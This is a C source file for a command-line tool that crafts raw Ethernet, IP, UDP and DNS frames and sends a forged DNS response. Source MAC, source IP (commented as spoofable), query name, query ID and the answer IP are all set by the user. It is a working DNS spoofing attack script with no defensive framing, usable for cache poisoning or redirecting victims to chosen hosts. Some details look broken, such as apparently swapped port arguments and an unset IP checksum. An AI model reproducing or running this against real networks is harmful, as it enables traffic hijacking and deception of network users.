#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ether.h>
#include <netinet/in.h>

struct dnshdr {
	__u16   ID;
	__u16   flags;
	__u16   questionNumber;
	__u16   answerNumber;
	__u16   authorityNumber;
	__u16   additionalNumber;
};

void copy(char *current,char *in,int size){
	//simple way to deal with \x00's better than spending time writing algorithm
	int i;
	for(i = 0;i < size;i++){
		strncpy(current,in,1);
		current += 1;
		in +=1;
	}
}

/*
 * This will convert www.google.com to 3www6google3com 
 * http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
 * */
void ChangetoDnsNameFormat(char* dns,char* host) {
	int lock = 0 , i;
	strcat((char*)host,".");

	for(i = 0 ; i < strlen((char*)host) ; i++) 
	{
		if(host[i]=='.') 
		{
			*dns++ = i-lock;
			for(;lock<i;lock++) 
			{
				*dns++=host[lock];
			}
			lock++; //or lock=i+1;
		}
	}
	*dns++='\0';
}

int intPostivePower(int base, int to){
	if(to == 0){
		return 1;
	}

	int val = base;
	for(int i =1;i < to;i++){
		val *= base;
	}
	return val;
}

int strToHex(char *hex){
	int val = 0;

	for(int i =0;i <= 1;i++){
		if(hex[i] == '0'){
		}else if(hex[i] == '1'){
			val += (1 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == '2'){
			val += (2 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == '3'){
			val += (3 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == '4'){
			val += (4 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == '5'){
			val += (5 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == '6'){
			val += (6 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == '7'){
			val += (7 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == '8'){
			val += (8 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == '9'){
			val += (9 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == 'a' || hex[i] == 'A'){
			val += (10 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == 'b' || hex[i] == 'B'){
			val += (11 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == 'c' || hex[i] == 'C'){
			val += (12 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == 'd' || hex[i] == 'D'){
			val += (13 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == 'e' || hex[i] == 'E'){
			val += (14 * (int)( intPostivePower(16,(1-i)) ));
		}else if(hex[i] == 'f' || hex[i] == 'F'){
			val += (15 * (int)( intPostivePower(16,(1-i)) ));
		}		
	}
	
	return val;
}

void setupDNSHeader(struct dnshdr *dnsHeader, char *id){
	dnsHeader->ID = htons(atoi(id));
	dnsHeader->flags = htons(33152);
	dnsHeader->questionNumber = htons(1);
	dnsHeader->answerNumber = htons(1);
	dnsHeader->authorityNumber = htons(0);
	dnsHeader->additionalNumber = htons(0);
}

void setupUDPHeader(struct udphdr *udpHeader,char *dstPort, char *srcPort){
	udpHeader->source = htons(atoi(srcPort));
	udpHeader->dest = htons(atoi(dstPort));
	udpHeader->check = 0; // skip
}

void setupIPHeader(struct iphdr *ipHeader, char* dst, char* src){
	/* IP Header */
	ipHeader->ihl = 5;
	ipHeader->version = 4;
	ipHeader->tos = 0;
	ipHeader->id = htons(2);
	ipHeader->ttl = 64; // hops
	ipHeader->protocol = 17; // UDP
	/* Source IP address, can be spoofed */
	ipHeader->saddr = inet_addr(src);
	/* Destination IP address */
	ipHeader->daddr = inet_addr(dst);
}

void setupEthernetHeader(struct ether_header *ethHeader,char* srcEth, char* destEth){
	/* source MAC */
	ethHeader->ether_shost[0] = strToHex(&srcEth[0]);
	ethHeader->ether_shost[1] = strToHex(&srcEth[3]);
	ethHeader->ether_shost[2] = strToHex(&srcEth[6]);
	ethHeader->ether_shost[3] = strToHex(&srcEth[9]);
	ethHeader->ether_shost[4] = strToHex(&srcEth[12]);
	ethHeader->ether_shost[5] = strToHex(&srcEth[15]);
	ethHeader->ether_dhost[0] = strToHex(&destEth[0]);
	ethHeader->ether_dhost[1] = strToHex(&destEth[3]);
	ethHeader->ether_dhost[2] = strToHex(&destEth[6]);
	ethHeader->ether_dhost[3] = strToHex(&destEth[9]);
	ethHeader->ether_dhost[4] = strToHex(&destEth[12]);
	ethHeader->ether_dhost[5] = strToHex(&destEth[15]);
	/* Ethertype field */
	ethHeader->ether_type = htons(ETH_P_IP);
}

void setupSocket(struct sockaddr_ll *socket_address,struct ifreq *if_idx, char* destEth){
	/* Index of the network device */
	socket_address->sll_ifindex = if_idx->ifr_ifindex;
	/* Address length*/
	socket_address->sll_halen = ETH_ALEN;
	/* Destination MAC */
	socket_address->sll_addr[0] = strToHex(&destEth[0]);
	socket_address->sll_addr[1] = strToHex(&destEth[3]);
	socket_address->sll_addr[2] = strToHex(&destEth[6]);
	socket_address->sll_addr[3] = strToHex(&destEth[9]);
	socket_address->sll_addr[4] = strToHex(&destEth[12]);
	socket_address->sll_addr[5] = strToHex(&destEth[15]);
}

void setupInterface(struct ifreq *if_mac,struct ifreq *if_idx,char* ifName,int sockfd){
	/* Get the index of the interface to send on */	
	memset(if_idx, 0, sizeof(struct ifreq));
	strncpy(if_idx->ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFINDEX, if_idx) < 0){
	    perror("Can't find index of the interface.");
	    exit(-1);
	}

	/* Get the MAC address of the interface to send on */	
	memset(if_mac, 0, sizeof(struct ifreq));
	strncpy(if_mac->ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFHWADDR, if_mac) < 0){
	    perror("Can't find MAC address of the interface.");
	    exit(-1);
	}
}

void usage(){
	printf("./<binary name> <interface> <src mac> <src ip> <src port> <dst mac> <dst ip> <dst port> <query name> <answer ip> <query id>\n");
	exit(-1);
}

int main(int argc, char *argv[]){
	/* check number of args */
	if(argc < 2){
		usage();
	}

	/* contrust packet container */
	char packet[65535];//max size of packet
	memset(packet, 0, 65535);	
	unsigned short size = 0;//so cant be bigger than buffer		

	/* Open RAW socket to send on */
	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (sockfd < 0) {
		perror("Can't establish raw socket...");
		exit(-1);
	}
	
	/*****************/
		/* set interface name */	
		/* setup interface to send out on, doesnt effect src mac */
		struct ifreq if_mac;
		struct ifreq if_idx;
		setupInterface(&if_mac, &if_idx, argv[1], sockfd);

		/* setup sock address, needed to send packet, only effects ethernet */
		struct sockaddr_ll socket_address;
		setupSocket(&socket_address,&if_idx,argv[5]);
	/*****************/
	
	/* Ethernet header */
	struct ether_header *ethHeader = (struct ether_header *) packet;
	size += sizeof(struct ether_header);
	setupEthernetHeader(ethHeader,argv[2],argv[5]);

	/* IP header */

	struct iphdr *ipHeader = (struct iphdr *) (packet + size);
	size += sizeof(struct iphdr);
	setupIPHeader(ipHeader,argv[6],argv[3]);

	/* UDP header */
	struct udphdr *udpHeader = (struct udphdr *) (packet + size);
	size += sizeof(struct udphdr);
	setupUDPHeader(udpHeader,argv[4],argv[7]);
	
	/* DNS header */
	struct dnshdr *dnsHeader = (struct dnshdr *) (packet + size);
	size += sizeof(struct dnshdr);
	setupDNSHeader(dnsHeader,argv[10]);

	/* DNS query */
	int querySize = 1+strlen(argv[8])+1+4;
	//as changetoDNSNameFormat seems to mess up argv[5] and theirfore argv[6/7]
	char *dnsFormatName = calloc(querySize-4,sizeof(char));
	char *dnsName = calloc(querySize-4,sizeof(char));
	strcpy(dnsName,argv[8]);
	ChangetoDnsNameFormat(dnsFormatName,dnsName);
	copy((char*) (packet + size),dnsFormatName,(strlen(dnsFormatName)+1));
	//add end of query
	char *endqueryPos = (char *) (packet + size + strlen(dnsFormatName)+1);
	char *endquery = "\x00\x01\x00\x01";
	copy(endqueryPos,endquery,4);
	size += querySize;

	/* DNS answer */
	char *answer = (char*) (packet + size);
	copy(answer,"\xc0\x0c\x00\x01\x00\x01\x00\x00\x0e\x10\x00\x04\xAC\x10\xC8\x01",16);
	*((int*) (answer+12)) = inet_addr(argv[9]);//answer ip
	size += 16;	

	/* set UDP len as we now know the data len */
	udpHeader->len = htons(8 + sizeof(struct dnshdr) + querySize + 16);
	/* set ip len as we now know udp len */
	ipHeader->tot_len = htons(8 + sizeof(struct dnshdr) + querySize + 16 + sizeof(struct iphdr));
	/* Send packet */
	if (sendto(sockfd, packet, size, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0){
	    printf("Sending packet failed.\n");
	}

	return 0;
}
